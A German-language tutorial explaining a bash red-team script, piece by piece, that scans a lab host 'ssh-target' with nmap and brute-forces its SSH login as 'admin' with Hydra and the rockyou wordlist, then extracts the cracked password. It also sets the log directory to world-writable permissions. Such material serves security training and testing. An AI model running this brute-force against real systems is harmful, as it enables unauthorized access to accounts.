# Red-Team Attack Script - Erklärung

Dieses Bash-Skript simuliert einen Angriff auf einen SSH-Dienst. Es führt einen Portscan mit Nmap durch und versucht dann einen Brute-Force-Angriff mit Hydra. **Nur in Testumgebungen verwenden!**

---

## ⚙️ 1. Kopfzeile und Sicherheitseinstellungen

```bash
#!/bin/bash
set -euo pipefail
```

- `#!/bin/bash`: Ausführung mit der Bash-Shell.
- `set -euo pipefail`:
  - `-e`: Abbruch bei Fehler.
  - `-u`: Fehler bei undefinierten Variablen.
  - `-o pipefail`: Fehler in einer Pipe führt zum Skriptabbruch.

---

## 📁 2. Variablendefinition

```bash
LOG_DIR="/logs"
MAIN_LOG="$LOG_DIR/attack.log"
NMAP_LOG="$LOG_DIR/nmap.txt"
HYDRA_LOG="$LOG_DIR/hydra.txt"
TARGET_HOST="ssh-target"
WORDLIST="/usr/share/wordlists/rockyou.txt"
```

Definiert Speicherorte für Logs, Zielhost und Passwortliste.

---

## 📅 3. Log-Funktion

```bash
log() {
    local msg="$1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $msg" | tee -a "$MAIN_LOG"
}
```

Gibt Nachrichten mit Zeitstempel in die Konsole und in die Log-Datei aus.

---

## ✅ 4. Vorbereitungschecks

```bash
log "Starte Angriff auf Ziel: $TARGET_HOST"
mkdir -p "$LOG_DIR"
chmod 777 "$LOG_DIR"
```

Erstellt Log-Verzeichnis und setzt Berechtigungen.

```bash
for tool in nmap hydra; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        log "Tool nicht gefunden: $tool"
        exit 1
    fi
done
```

Prüft, ob die Tools `nmap` und `hydra` vorhanden sind.

```bash
if [ ! -f "$WORDLIST" ]; then
    log "Wordlist nicht gefunden: $WORDLIST"
    exit 1
fi
```

Prüft, ob die Passwortliste existiert.

---

## 🔍 5. Portscan mit Nmap

```bash
nmap -sV -p 22,80,443 "$TARGET_HOST" -oN "$NMAP_LOG" >> "$MAIN_LOG" 2>&1
```

- Scannt Ports: 22 (SSH), 80 (HTTP), 443 (HTTPS)
- Erkennt Dienstversionen mit `-sV`
- Speichert Ergebnis in Log-Dateien

---

## 🔓 6. Brute-Force Angriff mit Hydra

```bash
hydra -l admin -P "$WORDLIST" -t 8 -vV -f -e nsr ssh://$TARGET_HOST:22 -o "$HYDRA_LOG"
```

- Brute-Force-Versuch auf SSH mit Benutzer `admin`
- `-t 8`: 8 gleichzeitige Verbindungen
- `-f`: Abbruch bei erstem Erfolg
- `-e nsr`: Testet auch leere Passwörter, Benutzername usw.

```bash
FOUND_PASS=$(grep -o "password: [a-zA-Z0-9]*" "$HYDRA_LOG" | tail -1 | cut -d' ' -f2)
```

Extrahiert gefundenes Passwort aus der Logdatei.

---

## 🏁 7. Abschlussmeldung

```bash
log "[+] Angriff abgeschlossen: $(date '+%Y-%m-%d %H:%M:%S')"
```

Gibt abschließende Erfolgsmeldung mit Zeitstempel aus.


